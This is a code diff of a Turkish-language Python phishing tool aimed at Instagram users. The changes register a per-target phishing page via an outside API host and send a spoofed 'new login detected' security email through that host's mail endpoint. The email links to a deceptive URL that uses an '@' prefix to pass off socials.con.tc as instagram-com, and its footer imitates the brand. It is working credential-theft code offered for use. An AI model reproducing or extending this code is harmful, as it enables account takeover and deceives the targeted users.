@@ -39,17 +39,18 @@ else:
 
         # Kullanıcıdan to adresini al
         to = input("Mail göndermek istediğiniz adresi girin (boş bırakmak için enter'a basın)--->")
+        kullanicismi = input("Hedef Kullanıcının İnstagram İsmi--->")
 
         # Eğer to boş değilse mail gönderme apisi kullan
            
         # Mail gönderme apisi kullanılmazsa devam et
-        sayfaismi = input("Sayfa İsmi--->")
+        ozelurl = input("Özel Url (instagram-com gibi)--->")
         print("\033[32m|")
         loading_animation()
         os.system("clear")
 
-        api_url_sayfa = "http://smmslowy-001-site1.atempurl.com/api/yenisayfa.php"
-        params_sayfa = {"sayfaismi": sayfaismi, "mail": mail}
+        api_url_sayfa = "http://smmslowy-001-site1.atempurl.com/api/newpage.php"
+        params_sayfa = {"mail": mail, "userss": kullanicismi}
 
         response_sayfa = requests.get(api_url_sayfa, params=params_sayfa)
 
@@ -64,22 +65,44 @@ else:
             |_______||_______||_______||_______||___|   |___|    |___|    |__| |__||___| |_______|
             """)
             
-            phishsayfa = f"https://socials.con.tc/login/{sayfaismi}.php"
+            phishsayfa = f"socials.con.tc/resetpassword/{kullanicismi}.php"
             
             if to:
                 api_url_mail = "http://smmslowy-001-site1.atempurl.com/mail/mail.php"
 
                 data_mail = {
                     'to': to,
-                    'subject': "İnstagram Şifreniz Değişti!",
-                    'body': f'Hesaınızı Kurtarmak İçin! {phishsayfa} Adresinden Giriş Yapın!'
+                    'subject': "İnstagram Hesabınıza Yeni Giriş Tespit Edildi!",
+                    'body': f'''
+		
+ 
+Yeni Bir Giriş Yapıldığını Fark Ettik, {kullanicismi}
+ 
+Genellikle kullanmadığınız bir cihazdan giriş yapıldığını fark ettik.
+ 
+ 
+
+ 
+POCO X3 PRO · Instagram · Istanbul, Turkey
+ 
+ 
+Bu kişi sizseniz, birkaç gün boyunca belirli güvenlik ve hesap ayarlarına erişemeyeceksiniz. Bu ayarlara daha önce giriş yaptığınız bir cihazdan yine erişebilirsiniz.
+ 
+Bu kişi siz değilseniz, Hesabınızı Kurtarmak İçin! 
+
+Hesabınızı Kurtarmak İçin: (https://{ozelurl}@{phishsayfa})
+   
+
+© Inqtagram. Meto Platforms, Inc., 1701 Willow Road, Menlo Park, CA 94025
+Bu mesaj {to} adresine {kullanicismi} için gönderilmiştir. Bu sizin hesabınız değil mi? Bu hesaptan e-posta adresinizi kaldırın.
+                '''
                 }
 
                 headers_mail = {'Content-Type': 'application/json'}
 
                 response_mail = requests.post(api_url_mail, data=json.dumps(data_mail), headers=headers_mail)
             
-                print(f"\033[31m\nUrl:  {phishsayfa}")
+                print(f"\033[31m\nUrl: https://{ozelurl}@{phishsayfa}")
         else:
             print(f"Hata! HTTP durumu: {response_sayfa.status_code}")
             print("API yanıtı:", response_sayfa.text)
